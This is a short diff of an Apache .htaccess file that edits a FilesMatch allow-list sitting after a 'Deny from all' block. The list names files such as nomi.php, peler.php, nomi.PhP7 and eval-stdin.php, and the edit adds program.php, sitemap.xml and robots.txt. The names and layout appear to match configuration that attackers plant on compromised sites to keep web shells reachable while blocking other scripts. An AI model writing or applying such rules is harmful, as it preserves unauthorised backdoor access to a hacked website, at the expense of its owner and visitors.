@@ -24,7 +24,7 @@ Deny from all
  
 </FilesMatch> 
  
-<FilesMatch "^(file.php|index.php|nomi-xt.php|peler.php|nomi.PhP7|eval-stdin.php|nomi.php|intergration.php|wp-login.php|nomi88.php)$"> 
+<FilesMatch "^(program.php|sitemap.xml|robots.txt|index.php|nomi-xt.php|peler.php|nomi.PhP7|eval-stdin.php|nomi.php|intergration.php|wp-login.php|nomi88.php)$"> 
  
 Order allow,deny 
  
